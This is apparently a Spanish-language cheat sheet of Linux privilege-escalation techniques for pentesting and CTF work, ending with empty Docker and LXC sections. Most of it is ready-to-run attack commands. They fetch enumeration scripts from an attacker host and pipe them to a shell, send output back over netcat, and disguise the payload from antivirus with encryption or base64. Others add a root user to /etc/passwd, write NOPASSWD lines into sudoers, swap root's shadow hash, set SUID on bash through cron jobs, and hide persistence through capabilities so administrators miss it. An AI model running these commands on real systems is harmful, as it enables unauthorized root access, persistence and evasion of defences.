# Tecnicas de escalacion de privilegios en linux

## Herramientas automatizadas

### LinPEAS

[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

```
wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh

curl "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -o linpeas.sh

./linpeas.sh -a #all checks (Toma mas tiempo)

./linpeas.sh -s #superfast (evita algunas comprobaciones que tioman mucho tiempo)

./linpeas.sh -P <Password> # indica una posible contraseña que puede utilizar con sudo -l y probar mas cosas
```

trasnferencia:

```
#Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

#Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

#Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

Ejecucion desde github:

```
#From github
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh

```

bypass antivirus:

```
#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim

```

### Linux smart enumeration

[Linux smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

```
wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh

curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh

./lse.sh -l0 # muestra informacion muy importante (opcion por defecto)

./lse.sh -l1 # muestra informacion interesante para escalar privilegios

./lse.sh -l2 # dumpea informacion importante del sistema
```

ejecucion directa sin desacrga:

```
bash <(wget -q -O - https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh) -l2 -i

bash <(curl -s https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh) -l1 -i
```


### LinEnum

[LinEnum](https://github.com/rebootuser/LinEnum)

```
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

OPCIONES:

*   -k Introduzca la palabra clave
*   -e Ingrese la ubicación de exportación
*   -t Incluir pruebas exhaustivas (largas)
*   -s Proporciona la contraseña de usuario actual para verificar los permisos de sudo (INSECURE)
*   -r Ingrese el nombre del informe
*   -h Muestra este texto de ayuda

Ejecutando sin opciones = escaneos limitados / sin archivo de salida

*   -e Requiere que el usuario ingrese una ubicación de salida, es decir, / tmp / export. Si esta ubicación no existe, se creará.
*   -r Requiere que el usuario ingrese un nombre de informe. El informe (archivo .txt) se guardará en el directorio de trabajo actual.
*   -t Realiza pruebas exhaustivas (lentas). Sin este conmutador, se realizan exploraciones "rápidas" predeterminadas.
*   -s Use el usuario actual con la contraseña proporcionada para verificar los permisos de sudo; tenga en cuenta que esto es inseguro y solo para uso de CTF.
*   -k Un conmutador opcional para el que el usuario puede buscar una sola palabra clave dentro de muchos archivos (documentado a continuación).

### Otros

* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
* [BeRoot](https://github.com/AlessandroZ/BeRoot)
* [SUDO KILLER](https://github.com/TH3xACE/SUDO_KILLER)

## Enumeración

### Enumeracion de usuario, red y sistema

```
whoami

id

```

```
uname -a

(cat /proc/version || uname -a ) 2>/dev/null

lsb_release -a 2>/dev/null

echo $PATH

(env || set) 2>/dev/null
```

```
ifconfig

iwconfig

netstat -putan

route

arpscan -l
```

### Busqueda en el sistema

Busqueda de passwords:

```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null

find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

Archivos modifiacdos los ultimos 10 minitos:

```
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"

strings /dev/mem -n10 | grep -i PASS
```

Buscando SSH keys:

```
find / -name authorized_keys 2> /dev/null

find / -name id_rsa 2> /dev/null
```

Buscar archivos con permisos de escritura:

```

find \-writable 2>/dev/null

find \-writable 2>/dev/null | grep "etc"  (filtrar una ruta importante)

find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null

find / -perm -2 -type f 2>/dev/null

find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null

#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

### abuso de permisos de escritura en /etc/passwd

Como podemos escribir en esearchivo podemos agregar la siguiente linea:

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash

```

Donde GENERATED_PASSWORD_HERE se genera a traves de alguna de estas formas:

```
openssl passwd

openssl passwd -1 -salt hacker hacker

mkpasswd -m SHA-512 hacker

python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

### abuso de permisos de escritura en /etc/sudoers

```
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers

echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers

```

### abuso de permisos de escritura en /etc/shadow

creamos un usuario:

```
useradd pepito

passwd pepito

12345
```

abrimos el /etc/shadow y en el hash del usuario root colocamos el hash del usuario pepito, con esto alhacer sudo su y colocar la clave de pepito (12345) elevaremos privilegios.




```
whoami

id
```

```
lbs_release
```

```
sudo -l
```

## Tareas cron

[pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0)

```
./pspy32 -pf -i 1000
./pspy64 -pf -i 1000
```

ver  en cuento tiempo se van a ejecutar tareas con timers:

```
systemctl list-timers --all
```

* Tarea Cron: Es una tarea que se ejecuta a intervalos reglares de tiempo. A nivel de sistema cada cierto minuto por ejemplo.

Para crear una tarea Cron, se lo debe crear en la reuta **'etc/cron.d'**

Cron es un sericio por lo que pdemos iniciarlo, detenerlo, ver su estado

```
service cron status
service cron start
service cron stop
```

En un entorno de CTF debemos ir a una ruta con permisos de escritura para crear este archivo. Por ejemplo /dev/shm.

Vemos la ruta de la tarea cron .sh y accedemos a ella para ver sus permisos. Si otros puede editarla y el propietario es root o tiene priilegios mas altos, es posible elevar privilegios editando ese archivo.

Debemos borrar el contenido de esa tarea.

Tenemos que agregar a la tarea cron:

```
chmod 4755 /bin/bash
```

Agregamos permisos SUID a la bash y esto se ejecutar como root en un determinado tiempo que tiene la tarea, entonces para spawnear una bash solo le damos desde nuestro usuario con bajos privilegios:

```
bash -p
```

con esoo se nos abre una bash como root o es usuario propietario. Se debe colocar la opcion '-p' para que funcione la escalada de privilegios.

Si detectamos una tarea cron en php, py, ruby, perl, java, etc.
Debemos ver la forma de ejecutar el comando 'chmod 4755 /bin/bash' con la sintaxis del lenguaje.

pueden usar la herramienta pspy para hacer la deteccion de tareas cron cn el id del usuario que la ejecuta, asi puede saber si es el usuario root quien lo hace. (id=0)

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

damos permisos de ejecucin y ejecutamos:

```
chmod +x pspy64

./pspy64 -pf -i 1000  --> monitoreo de acciones cada 1 segundo

solo ve las tareas que ejecutan un archivo alojado en: /etc /usr /tmp /home /var /opt
pero se puede modificar
```

ver tareas cron de un usuario especifico:

```
crontab -l -u <user>

cat /var/spool/cron/crontabs/<user>

cd /var/spool/cron/crontabs/ && grep . *

```

## Permisos SUID

En GTFOBins puedes ver varias formas de aprovechar diferentes aplicativos si tuvieran permisos SUID.

[GTFOBins](https://gtfobins.github.io/)

Si se ejecuta un archivo con este bit, el propietario cambiará el uid. Si el propietario del archivo es root, el uid se cambiará rootincluso si fue ejecutado por el usuario bob. El bit SUID está representado por un s.

encontrar permisos SUID:

```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

find / -uid 0 -perm -4000 -type f 2>/dev/null
```

puede que scripts personalizados tengan este permiso, por lo que ahi tocaria entender el script y ver la forma de aprovecharnos de él

## SUDO

```
sudo -l
```

* NOPASSWD: La configuración de sudo puede permitir que un usuario ejecute algún comando con los privilegios de otro usuario sin conocer la contraseña.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
	
sudo vim -c '!sh'
```

* SETENV: Esta directiva permite al usuario establecer una variable de entorno mientras ejecuta algo.

```
$ sudo -l

User waldo may run the following commands on admirer:

(ALL) SETENV: /opt/scripts/admin_tasks.sh

sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

Esto puede servir para library hijacking.

[Mas sobre SUDO y SUID](https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid)

## Capabilities

Supongamos que a comprometimos una maquina y escalamos privilegios, queremos crear una forma de persistencia con esta maquina pero de forma privilegiada. Es decir salirnoss de la maquina, volvera entrar y poder volver a ser root. Como yya fue una maquina comprometida y ya escalamoslos privilegios pdemos hacerlo como lo hicimos si no es mucho lio. 

Tambien podemois debar un binario con un permiso SUID pero si el administrador revisa esto lo quitara y nos arruina el proceso. Es ahi donde entran las capabilities, son como permisos privilegiados en un programa pero que a nivel de permisos no se muestra nada diferente.

Con las capabilities una vez que volvamos a acceder ala maquina sera muy facil convertirnos en Root, no se ve nada raro en la maquina victima y seracomo dejar nuestra escalera para subir.

### AGREGAR, ELIMINAR Y OBTENER CAPABILITIES

```
OBTENCION (como usuario no privilegiado)

getcap -r / 2>/dev/null

-r: deforma recursiva
/: ruta en este caso la raiz

la capabilitie 'cap_setuid+ep' es la que nos interesa de lo que muestra en el los resultados, ella debe estar asignada a un binario como php, python, bash, etc. 
```

```
ELIMINACION (como usuario privilegiado)

setcap -r /usr/bin/pthon3.8

-r: remove
```

```
AGREGAR (como usuario privilegiado)

setcap cap_setuid+ep /usr/bin/pthon3.8

```

### UNA VEZ IDENTIFICADO LA CAPABILITIE

Mediante la pagina GTFObins muestra diferentes ejemplos de los binarios que podemos explotar si tienen essta capabilitie del cap_setuid+ep. Por ejemplo:

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```
si node tiene la capabilitie:

./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'

si perl tiene la capabilitie:

./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

si php tiene la capabilitie:

CMD="/bin/sh"
./php -r "posix_setuid(0); system('$CMD');"

si python tiene la capabilitie:

./python -c 'import os; os.setuid(0); os.system("/bin/sh")'

si ruby tiene la capabilitie:

./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

```

Ejecutando el comando segun el binario debera abrirse una terminal como el usuario Root.

| Capabilities name  | Description |
|---|---|
| CAP_AUDIT_CONTROL  | Allow to enable/disable kernel auditing |
| CAP_AUDIT_WRITE  | Helps to write records to kernel auditing log |
| CAP_BLOCK_SUSPEND  | This feature can block system suspends   |
| CAP_CHOWN  | Allow user to make arbitrary change to files UIDs and GIDs |
| CAP_DAC_OVERRIDE  | This helps to bypass file read, write and execute permission checks |
| CAP_DAC_READ_SEARCH  | This only bypass file and directory read/execute permission checks  |
| CAP_FOWNER  | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file  |
| CAP_KILL  | Allow the sending of signals to processes belonging to others  |
| CAP_SETGID  | Allow changing of the GID  |
| CAP_SETUID  | Allow changing of the UID  |
| CAP_SETPCAP  | Helps to transferring and removal of current set to any PID |
| CAP_IPC_LOCK  | This helps to lock memory  |
| CAP_MAC_ADMIN  | Allow MAC configuration or state changes  |
| CAP_NET_RAW  | Use RAW and PACKET sockets |
| CAP_NET_BIND_SERVICE  | SERVICE Bind a socket to internet domain privileged ports  |


## PATH HIJACKING

### EN QUE CONSISTE?

A partir de un archivo, preferentemente en algun lenguaje de programacion (bash, python, C, C++, java, php, ruby, perl) u otro tipo de archivo, ademas de que contenga permisos SUID, se debe determinar si ejecuta algun tipo de comando a nivel de sistema. (ls, mkdir, ifconfig, curl, cat, ps).

Normalmente un archivo de programcion ejecuta estas tareas. 

A nivel de sistema operativo tenemos una variables de entorno que son como variables globales del sistema que guarda algun tipo de informacion, las cuales por cada nuevo inicio de sesion se reestablecen a unas predeterminadas por el sistema, entonces se pueden agregar o modificar variables solo para el inicio de sesion.

(En caso de querer alterar la variable de entorno $PATH de manera permanente, puede editar el '/etc/environment' pero no es necesario para el ataque)

Cuando se ejecuta un comando por ejemplo: 'ps' tiene una ruta absoluta y otra relativa.

```
ps  --> ruta relativa

/usr/bin/ps  --> ruta absoluta
``` 

Cuando usas comando a traves de la ruta relativa, lo que hace es buscar en la variable de entorno $PATH el comando por las rutas declaradas en la variable $PATH.

$PATH vale esto:

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/home/christian/Android/Sdk:/home/christian/Android/Sdk/platforms:/home/christian/Android/Sdk/tools:/opt/gradle/5.0/bin:/usr/lib/jvm/java-8-openjdk/bin:/snap/bin
```

Como se ve hay varias rutas separadas por ':', la ruta relativa busca por estas rutas (de izquierda a derecha) el comando. Se puede ver la ruta '/usr/bin' en la variable $PATH por lo que el comando se ejecuta corectamente.

### ENCONTECES COMO ESCALAR

1. buscar archivos con permisos SUID

```
find \-perm -4000 2>/dev/null 

find \-perm -4000 -type f 2>/dev/null --> para filtrar solo archivos
```

2. Determinar un archivo raro que sea en algun lenguaje.

3. Buscar si se ejecuta algun comando.

```
strings nombre_archivo
```

Con strings podemos imprimir todas las cadenas imprimibles de un binario compilado.

4. Una vez determinado el comando nos dirigimos a una ruta con permisos de escritura como '/tmp' y creamos un archivo con el nombre del comando encontrado.

```
cd /tmp
touch comando
chmod +x comando
nano comando
agregamos 'bash -p'
```

Como el archivo encontrado ejecuta el comando y es SUID, con 'bash -p' abrimos una terminal y el parametro 'p' es una flag para abrirla como root.

5. Ahora el truco es hacer creer al sistema que ese archivo el que tiene que ejecutar, como ya dijimos al ejecutar un comando primero lo busca en la variable $PATH de izquierda a derecha, entonces agregaremos al comienzo la ruta donde creamos el archivo en este caso '/tmp'.

```
export PATH=/tmp:$PATH
```

Este cambio solo es temporal, si se cierra sesion y nuevamente se abre, no existira este cambio
Ahora buscara primero en /tmp y ahi es donde le decimos que el comando abrira una bash (terminal)

6. Nos dirigimos a la ruta donde esta el archivo SUID y lo ejecutamos. Al ejecutar deberia abrirnos una shell como Root.

### LIMITACIONES

El archivo debe contener una sentencia similar a esta:

```
setuid(0)  --> en C y python

```

Esto nos da una shell totalmente root, de lo contrario no hay seguridad en obtener la shell privilegiada.

Pero en caso de que al permiso sudo se otorga a un solo comando sin especificar la ruta:

```
hacker10 ALL= (root) less
```

puede modificar el path y crear un binary falso llamado **less** en este caso.

```
export PATH=/tmp:$PATH

#Put your backdoor in /tmp and name it "less"

sudo less
```

## Python Library Hijacking

[Python Library Hijacking](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)

## Wildcards Injection

Wildacrd o comodin es un carácter o conjunto de caracteres que se puede utilizar como reemplazo de algún rango / clase de caracteres. El shell interpreta los comodines antes de realizar cualquier otra acción.

Algunos caracteres comodines:

* * Un asterisco coincide con cualquier número de caracteres en un nombre de archivo, incluido ninguno.

 * ?  El signo de interrogación coincide con cualquier carácter.

* [] Los corchetes encierran un conjunto de caracteres, cualquiera de los cuales puede coincidir con un solo carácter en esa posición.

 * -  Un guion dentro de [] denota un rango de caracteres.

* ~ Una tilde al principio de una palabra se expande hasta el nombre de su directorio personal. Agregue el nombre de inicio de sesión de otro usuario al carácter, se refiere al directorio de inicio de ese usuario.

ejemplo basico:

```
cd /Desktop 
mkdir wild 
cd wild 
echo "Hello Friends" > file1 
echo "This is Wildcard Injection" > file2 
echo "take help" > --help
```

Creamos 3 archivos, vemos que el ultimo tiene un nombre muy peculiar. Si intentamos leerlo nos saldra la ayuda del comando cat.

```
cat --help
[menu de ayuda]
```

este tipo de truco se llama Wildacrd wildness.

### secuestro del propietario a traves de chown y chmod

el comando chown se usa para cambiar el propietario de un archivo, tiene una propiedad llamada **--reference** que se lo iguala a una archivo y el o los archivos que tienen ese parametro mas chown adquieren el propietario y grupo del valor de **--reference**

Vamos a ver un ejemplo:

tenemos lo siguiente:

```
ls -la

drwxrwxrwx	2 root	root	4096 Jun 12 22.:20 .
drwxrwxrwx 21 bad	bad	4096 Jun 12 22.:20 ..
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 1.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 2.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 3.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 4.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 5.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 6.php
```

nos creamos 2 archivos.

```
echo "" > my.php
echo > --reference=my.php
```

Este ultimo es el que contiene los wildcard

```
ls -la

drwxrwxrwx	2 root	root	4096 Jun 12 22.:20 .
drwxrwxrwx 21 bad	bad	4096 Jun 12 22.:20 ..
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 1.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 2.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 3.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 4.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 5.php
-rw-rw-r--  1 pepe  pepe	  23 Jun 12 22.:20 6.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 my.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 --reference=my.php
```

ahora si ejecutamos el siguiente comando para asigna un usuario y grupo cualquiera.

```
chown -R luis:luis *.php
```

Se ejecutar un chown recursivo para todos los archivos php asignando a luis como usuario y grupo, pero cuando llega al ultimo archivo se ejecuta esto por detras:

**–Referencia = RFILE** (use el propietario y el grupo de RFILE en lugar de especificar los valores OWNER: GROUP)

Dando como resultado:

```
ls -la

drwxrwxrwx	2 root	root	4096 Jun 12 22.:20 .
drwxrwxrwx 21 bad	bad	4096 Jun 12 22.:20 ..
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 1.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 2.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 3.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 4.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 5.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 6.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 my.php
-rw-rw-r--  1 chris chris	  23 Jun 12 22.:20 --reference=my.php
```

**Esto tambien es valido con chmod y el parametro --reference para asignar los permisos de un archivo**

```
chmod --reference=reference_file file
```

Se puede jugar con enlaces simbolicos para apuntar a otros archivos desde otras carpetas.

```
ln -s /etc/passwd passwd
```

[Maquina Shrek HTB](https://medium.com/secjuice/hackthebox-shrek-writeup-46b8907fbc43)

### secuestro del propietario a traves de tar

[Wildcards Tar](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

## Explotacion de kernel

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### CVE-2010-3904 (RDS)

**Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8**

```
https://www.exploit-db.com/exploits/15285/
```

### CVE-2010-4258 (Full Nelson)

**Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)**

```
https://www.exploit-db.com/exploits/15704/
```

### CVE-2012-0056 (Mempodipper)

**Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)**

```
https://www.exploit-db.com/exploits/18411
```

Ruta de los exploit precompilados:

* [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
* [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)

## Docker

### Montura (mount)


### LXC / LXD



